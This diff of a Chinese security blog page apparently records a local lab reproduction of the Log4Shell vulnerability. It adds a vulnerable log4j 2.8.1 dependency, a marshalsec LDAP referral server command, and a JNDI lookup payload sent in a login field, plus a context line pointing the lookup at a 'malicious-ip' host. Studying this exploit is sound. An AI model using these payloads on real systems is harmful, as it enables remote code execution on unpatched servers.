@@ -30,9 +30,9 @@
 
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="wa0er" type="application/atom+xml">
-
+<meta name="generator" content="Hexo 6.0.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="wa0er" type="application/atom+xml">
 </head>
 
 
@@ -481,14 +481,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.7k&nbsp;字
+                    3.8k&nbsp;字
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    14 分
+                    15 分
                 </div>
                 
 
@@ -534,6 +534,18 @@
 <p>如果第一次创建，需稍等片刻下载spring-boot相关依赖，IDEA右下角可查看相关依赖下载进度。</p>
 <p>修改pom.xml文件</p>
 <img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908091549004.png" style="zoom:80%;">
+
+<p>添加如下代码</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>log4j-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.8.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>log4j-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.8.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908091247246.png" style="zoom:80%;">
 
@@ -621,19 +633,19 @@
 <p>下载：<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p>
 <p>参考：<a target="_blank" rel="noopener" href="https://exploit-notes.hdks.org/exploit/web/log4j-pentesting/#exploit-apache-solr-(jndi)">https://exploit-notes.hdks.org/exploit/web/log4j-pentesting/#exploit-apache-solr-(jndi)</a></p>
 <p>下载marshalsec，进到主目录，用如下命令编译</p>
-<pre class="line-numbers language-none"><code class="language-none">mvn clean package -DskipTests<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">mvn clean package -DskipTests<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>编译成功cmd窗口末尾会显示如下内容</p>
 <p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908111918530.png"></p>
 <p>然后开启LDAP服务</p>
-<pre class="line-numbers language-none"><code class="language-none">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:9898/#Exp"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:9898/#Exp"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908112631128.png"></p>
 <p>通过HackBar用POST请求发送json格式payload如下，执行后，会弹出系统计算机</p>
-<pre class="line-numbers language-none"><code class="language-none">{
-	"user": "wa0er",
-	"password": "${jndi:ldap://127.0.0.1:1389/Exp}"
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
+	<span class="token property">"user"</span><span class="token operator">:</span> <span class="token string">"wa0er"</span><span class="token punctuation">,</span>
+	<span class="token property">"password"</span><span class="token operator">:</span> <span class="token string">"${jndi:ldap://127.0.0.1:1389/Exp}"</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908113116419.png"></p>
 <p>此时看LDAP和HTTP服务窗口如下，<code>Exp.class</code>被调用执行</p>
@@ -1652,7 +1664,7 @@ ${jndi:ldap://malicious-ip/Exp}	#此时需要ldap服务端口为389<span aria-hi
             
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点文章总字数:&nbsp;<span
-                        class="white-color">61.4k&nbsp;字</span>
+                        class="white-color">61.5k&nbsp;字</span>
             
             
 
